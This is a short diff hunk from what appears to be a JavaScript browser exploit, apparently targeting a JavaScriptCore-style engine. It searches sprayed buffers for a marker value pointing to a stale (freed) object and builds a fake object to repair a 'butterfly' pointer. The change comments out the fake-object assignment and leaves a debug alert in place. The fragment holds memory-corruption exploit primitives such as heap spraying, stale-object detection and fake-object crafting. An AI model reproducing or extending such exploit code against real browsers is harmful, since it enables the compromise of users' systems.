@@ -171,7 +171,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-				stale[0] = fakeobj;
+				//stale[0] = fakeobj;
  				alert("1");
 
 				stale[0] = {
